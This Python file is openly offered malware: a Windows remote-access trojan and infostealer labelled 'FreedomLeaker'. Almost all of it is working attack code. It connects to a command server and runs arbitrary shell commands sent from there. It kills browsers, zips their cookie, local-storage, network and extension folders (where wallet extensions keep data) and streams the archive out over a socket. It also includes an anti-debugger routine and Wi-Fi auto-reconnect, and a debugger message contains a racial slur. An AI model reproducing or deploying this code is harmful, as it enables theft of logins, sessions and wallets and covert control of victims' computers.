import pywifi, time, threading, os, socket, subprocess, requests, shutil, getpass, tempfile, random, re, psutil

# CONFIG START ====================

server_ip = '127.0.0.1'
server_port = 65172

# CONFIG END =======================

myuid = ''

username = getpass.getuser()

paths = [    
    [f"C:/Users/{username}/AppData/Roaming/Opera Software/Opera GX Stable",               "opera.exe",        "/Local Storage/leveldb",           "/",             "/Network",             "/Local Extension Settings/"                      , tempfile.gettempdir()+'/opera'+str(random.randint(100000,999999))],
    [f"C:/Users/{username}/AppData/Roaming/Opera Software/Opera Stable",                  "opera.exe",        "/Local Storage/leveldb",           "/",             "/Network",             "/Local Extension Settings/"                      , tempfile.gettempdir()+'/opera1'+str(random.randint(100000,999999))],
    [f"C:/Users/{username}/AppData/Roaming/Opera Software/Opera Neon",  "opera.exe",        "/Local Storage/leveldb",           "/",             "/Network",             "/Local Extension Settings/"                      , tempfile.gettempdir()+'/opera2'+str(random.randint(100000,999999))],
    [f"C:/Users/{username}/AppData/Local/Google/Chrome",                        "chrome.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              , tempfile.gettempdir()+'/chrome'+str(random.randint(100000,999999))],
    [f"C:/Users/{username}/AppData/Local/Google/Chrome SxS",                    "chrome.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              , tempfile.gettempdir()+'/chrome2'+str(random.randint(100000,999999))],
    [f"C:/Users/{username}/AppData/Local/Google/Chrome Beta",                   "chrome.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              , tempfile.gettempdir()+'/chrome3'+str(random.randint(100000,999999))],
    [f"C:/Users/{username}/AppData/Local/Google/Chrome Dev",                    "chrome.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              , tempfile.gettempdir()+'/chrome4'+str(random.randint(100000,999999))],
    [f"C:/Users/{username}/AppData/Local/Google/Chrome Unstable",               "chrome.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              , tempfile.gettempdir()+'/chrome5'+str(random.randint(100000,999999))],
    [f"C:/Users/{username}/AppData/Local/Google/Chrome Canary",                 "chrome.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              , tempfile.gettempdir()+'/chrome6'+str(random.randint(100000,999999))],
    [f"C:/Users/{username}/AppData/Local/BraveSoftware/Brave-Browser",          "brave.exe",        "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              , tempfile.gettempdir()+'/brave'+str(random.randint(100000,999999))],
    [f"C:/Users/{username}/AppData/Local/Vivaldi",                              "vivaldi.exe",      "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              , tempfile.gettempdir()+'/vivaldi'+str(random.randint(100000,999999))],
    [f"C:/Users/{username}/AppData/Local/Yandex/YandexBrowser",                 "yandex.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/HougaBouga/"                                    , tempfile.gettempdir()+'/yandex'+str(random.randint(100000,999999))],
    [f"C:/Users/{username}/AppData/Local/Yandex/YandexBrowserCanary",           "yandex.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/HougaBouga/"                                    , tempfile.gettempdir()+'/yandex2'+str(random.randint(100000,999999))],
    [f"C:/Users/{username}/AppData/Local/Yandex/YandexBrowserDeveloper",        "yandex.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/HougaBouga/"                                    , tempfile.gettempdir()+'/yandex3'+str(random.randint(100000,999999))],
    [f"C:/Users/{username}/AppData/Local/Yandex/YandexBrowserBeta",             "yandex.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/HougaBouga/"                                    , tempfile.gettempdir()+'/yandex4'+str(random.randint(100000,999999))],
    [f"C:/Users/{username}/AppData/Local/Yandex/YandexBrowserTech",             "yandex.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/HougaBouga/"                                    , tempfile.gettempdir()+'/yandex5'+str(random.randint(100000,999999))],
    [f"C:/Users/{username}/AppData/Local/Yandex/YandexBrowserSxS",              "yandex.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/HougaBouga/"                                    , tempfile.gettempdir()+'/yandex6'+str(random.randint(100000,999999))],
    [f"C:/Users/{username}/AppData/Local/Microsoft/Edge",                       "msedge.exe",         "/Default/Local Storage/leveldb",   "/Default",      "/Default/Network",     "/Default/Local Extension Settings/"            , tempfile.gettempdir()+'/msedge'+str(random.randint(100000,999999))  ]
]

love = [
    '/User Data/Default/Network',
    '/User Data/Default/Local Storage',
    '/User Data/Local State',
    "/Default/Local Extension Settings",
    "/Network",
    "/Local Extension Settings",
    "/Local Storage"
]

def StealBrowser(path, exename, path2):

    os.system(f'taskkill /f /im {exename}')

    time.sleep(3)

    temp_dir = tempfile.gettempdir()+'/'+str(random.randint(100000,999999))
    os.makedirs(temp_dir)

    #path2 = tempfile.gettempdir()+'/'+exename+str(random.randint(100000,999999))

    for foldername, subfolders, filenames in os.walk(path):
        for filename in filenames:
            file_path = (foldername+'/'+filename).replace('\\', '/')

            withoutpath = file_path.removeprefix(path)

            for el in love:

                if withoutpath.startswith(el):

                    #print(withoutpath)
                    
                    last = ''

                    for bb in withoutpath.split('/')[:-1]:
                        #print(bb)
                        last+=f'/{bb}'

                        if not os.path.exists(f'{temp_dir}{last}'): 
                            try:os.makedirs(f'{temp_dir}{last}')
                            except Exception as e:print(e)
                    
                    shutil.copyfile(path+withoutpath, temp_dir+withoutpath)

    shutil.make_archive(path2, 'zip', temp_dir)

                    #with open(f'{temp_dir}{withoutpath}', 'wb') as f:
                        
                    #    with open(path+withoutpath, 'rb') as f2: f.write(f2.read())
                    
    return path2

def GetJSONip():

    try:

        r = requests.get('https://jsonip.com/')
        return r.json()['ip']

    except Exception as e:
        
        print(f'Error fetch ip: {e}')
        return '???'

def StartNeeded():

    threading.Thread(target=ConnectToServer).start()
    threading.Thread(target=AutoReconnect).start()
    threading.Thread(target=AntiDebugger).start()

def ReturnData(server, text : str):

    text = text.encode('cp1251')
    server.sendall(text)

def bgtask(command, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, cwd="./"): return subprocess.Popen(command, shell=True, stdout=stdout, stderr=stderr, cwd=cwd, encoding='cp1251')

def GetTasks():

    processes = psutil.process_iter()
    res = ''
    for process in processes:
        res+=f"|||Process ID: {process.pid}, Name: {process.name()}"
    return res

def UseCommand(server, cmd):

    process = bgtask(cmd)

    while True:

        output = process.stdout.readline()

        if output == b'' and process.poll() is not None:

            ReturnData(server, f'Command {cmd} has been ended!')
            print(f'Command {cmd} has been ended!')

            break

        if output:
            
            try:
                output_str = output.decode('cp1251')
            except:
                output_str = str(output) # shit

            ReturnData(server, f'CMDOUTPUT {output_str}')
            print(f'Command output: {output_str}')

def ConnectToServer():

    global myuid

    try:

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((server_ip, server_port))
        
        ip = GetJSONip()
        s.sendall(b"Connected || by FreedomLeaker (Sonys9 github) || "+ip.encode())

        while True:

            data = s.recv(16000)
            data = data.decode()

            print(data)

            if not data.startswith('[SRV]'): continue

            args = data.split(' ')
            args.pop(0)
            cmd = args[0]
            uid = args[1]

            if cmd == 'SETUID': 

                myuid = uid
                print(f'UID => {myuid}')

            if uid == myuid:

                args.pop(0)
                args.pop(0)
                
                if cmd == 'get_tasklist':

                    all = GetTasks()

                    s.sendall(b'TASKLIST '+all.encode())

                if cmd == 'kill_process':

                    UseCommand(s, 'taskkill /f /im '+' '.join(args))

                if cmd == 'os_use_cmd':

                    print(f'Using command {" ".join(args)}...')

                    threading.Thread(target=UseCommand, args=(s, ' '.join(args))).start()

                if cmd == 'steal_cookies':

                    s.sendall(b'LOG Starting...')

                    good = []
                    threads = []

                    for path in paths:

                        if os.path.exists(path[0]):

                            good.append(path[-1])

                            thr = threading.Thread(target=StealBrowser, args=(path[0], path[1],path[-1]))
                            thr.start()
                            threads.append(thr)

                    for thread in threads: thread.join()

                    tempdir = tempfile.gettempdir()+'\\'+str(random.randint(1000000,9999999))

                    os.makedirs(tempdir)

                    time.sleep(1)

                    for cool in good:

                        shutil.copyfile(cool+'.zip', tempdir+'\\'+cool.split('/')[-1]+'.zip')

                    shutil.make_archive(tempdir+'arch', 'zip', tempdir)

                    s.sendall(b'SFTRUE123 '+(tempdir+'arch.zip'.split('\\')[-1]).encode())

                    time.sleep(3)

                    with open(tempdir+'arch.zip', 'rb') as f:

                        while True:

                            filecontent = f.read(64000)

                            if not filecontent: break

                            s.sendall(filecontent)
                            print('sent bytes')

                    time.sleep(3)

                    s.sendall(b'SFFALSE123')

    except: ConnectToServer()

def AntiDebugger():
    print('AntiDebugger has been started!')
    while True:
        startTime = time.time()
        time.sleep(0.5)
        if time.time()-startTime>1: 
            print('Debugger detected! Fuck you nigger!!!!')
            os._exit(0)

def AutoReconnect(): # scan every 30 seconds

    while True:

        time.sleep(30)

        wifi = pywifi.PyWiFi()
        ifaces = wifi.interfaces()

        for iface in ifaces:

            if iface.status() == pywifi.const.IFACE_CONNECTED: break

        else: # if not broken  ------------------->>>>>>  here ^^^^^
              # down code happens if you are disconnected from wifi
            
            for iface in ifaces:

                iface.scan()

                print('Waiting...')

                time.sleep(5)

                print('Got results')

                results = iface.scan_results()

                profiles = iface.network_profiles()

                for result in results:

                    for profile in profiles:

                        if profile.ssid != result.ssid: continue

                        print(f'{profile.ssid} <=> {result.ssid}')
                            
                        iface.connect(profile)

threading.Thread(target=StartNeeded).start()